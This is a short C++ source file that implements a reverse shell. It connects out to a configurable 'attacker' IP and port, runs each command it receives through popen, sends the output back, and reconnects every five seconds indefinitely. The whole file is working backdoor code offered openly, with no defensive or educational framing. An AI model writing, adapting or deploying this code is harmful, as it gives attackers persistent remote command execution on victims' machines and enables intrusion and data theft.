// Basic Libraries
#include <iostream>
#include <cstring>
#include <stdexcept>
// Socket Libraries
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
// Time
#include <chrono>
#include <ctime>
#include <thread>

using namespace std;

char *port = (char *) "8000"; // Change this to the attacker port
char *host = (char *) "192.168.1.64"; // Change this to the attacker IP
int connect_each_seconds = 5;

void make_connection()
{
    // Describing socket
    int socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if ( socket_desc < 0 )
    {
        cout<<"\n[x] An error has ocurred while describing the socket!\n";
        exit(2);
    }

    // Binding socket
    int fport = atoi(port);
    struct sockaddr_in attacker_addr;
    attacker_addr.sin_family = AF_INET;
    //attacker_addr.sin_addr.s_addr = INADDR_ANY;
    attacker_addr.sin_port = htons(fport);

    // Convert IPvx to binary
    int conv_ip_2_bin = inet_pton( AF_INET, host, &attacker_addr.sin_addr );
    if ( conv_ip_2_bin < 0 )
    {
        cout<<"\n[x] An error has ocurred while converting IP to binary!\n";
        exit(2);
    }

    // Connect to attacker
    int connect_attacker = connect( socket_desc, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr) );
    if ( connect_attacker < 0 )
    {
        cout<<"\n[x] An error has ocurred while connecting to server!\n";
        //exit(1);
    } else
    {
        // Receive data from attacker
        char buffer[1024] = {0};
        int data;
        // Variables Command Execution
        char buffercmd[1024];
        string stdout;
        FILE *pipe;

        do
        {
            data = read( socket_desc, buffer, 1024 );

            pipe = popen(buffer, "r");

            if (!pipe) throw runtime_error("popen() failed!");

            try{
                while( fgets(buffercmd, sizeof(buffercmd), pipe) != NULL )
                {
                    stdout += buffercmd;
                }
            } catch(...)
            {
                //send( socket_desc, exc.c_str(), strlen(exc.c_str()), 0 );
                pclose(pipe);
            }

            send( socket_desc, stdout.c_str(), strlen(stdout.c_str()), 0 );

            pclose(pipe);

        } while( strcmp(buffer, "exit") != 0 );
    }

    close(socket_desc);
}

int main()
{
    while( true )
    {
        make_connection();
        this_thread::sleep_for(chrono::seconds(connect_each_seconds));
    }
    return 0;
}

